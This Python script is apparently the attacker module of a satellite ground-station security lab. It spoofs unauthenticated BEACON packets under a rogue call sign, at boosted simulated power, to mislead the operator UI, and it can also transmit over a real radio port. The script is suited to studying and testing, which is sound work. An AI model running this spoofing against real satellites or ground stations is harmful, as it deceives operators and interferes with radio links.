"""
Beacon spoofer — emit a fake BEACON from a "second satellite" call
sign at the satellite's normal beacon cadence (every 10 s).

The BEACON APID (0x001) is by design unauthenticated even at L3 —
beacons are public service ads, just like APRS or amateur sat
beacons in the real world. That makes spoofing trivial.

The fun lives downstream: the operator UI displays "the latest
beacon" and an attacker beacon at +13 dBm (= just "louder" than the
real sat in the sim's RSSI model) wins every time. If the operator
auto-trusts the beacon for satellite identification or telemetry
mode, they can be steered.

Usage:
    python -m groundstation.attacker.spoof_beacon --sim \\
        --callsign "ROGUE-1" --mode 1 --soc 5 --interval 10
"""

import argparse
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, ROOT)

from protocol import space_packet as sp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port")
    ap.add_argument("--sim", action="store_true")
    ap.add_argument("--node-id", default="SPOO")
    ap.add_argument("--callsign", default="ROGUE-1")
    ap.add_argument("--mode", type=int, default=1, help="advertised mode (1 = SAFE)")
    ap.add_argument("--boot", type=int, default=9999)
    ap.add_argument("--uptime", type=int, default=12345)
    ap.add_argument("--soc",  type=int, default=15, help="advertised battery %")
    ap.add_argument("--interval", type=float, default=10.0,
                    help="seconds between spoofed beacons")
    ap.add_argument("--duration", type=float, default=60.0)
    ap.add_argument("--tx-power", type=int, default=13,
                    help="sim tx_power_dbm (higher = louder RSSI than real sat)")
    ap.add_argument("--freq", type=int, default=433_920_000)
    ap.add_argument("--sync", default="d391")
    ap.add_argument("--bitrate", type=int, default=9600)
    args = ap.parse_args()

    if not args.sim and not args.port:
        ap.error("--port required unless --sim")
    if args.sim:
        # Bypass the make_link factory so we can override tx_power.
        from sim.sim_link import SimLink
        link = SimLink(node_id=args.node_id, tx_power_dbm=args.tx_power)
    else:
        from groundstation.shared.link import Link
        link = Link(args.port)
    time.sleep(0.5)
    link.send_cfg(args.freq, int(args.sync, 16), args.bitrate)

    deadline = time.time() + args.duration
    seq = 0
    print(f"spoofing as '{args.callsign}', interval={args.interval}s, "
          f"power={args.tx_power} dBm")
    while time.time() < deadline:
        seq = (seq + 1) & 0x3FFF
        body = ("%s M%d B%d U%d SOC%d" %
                (args.callsign, args.mode, args.boot, args.uptime, args.soc)).encode()
        frame = sp.encode(sp.TYPE_TM, sp.APID_BEACON, seq, body)
        link.send_tx(frame)
        print(f"  tx beacon  seq={seq}  body={body!r}")
        time.sleep(args.interval)
    print("done")


if __name__ == "__main__":
    main()
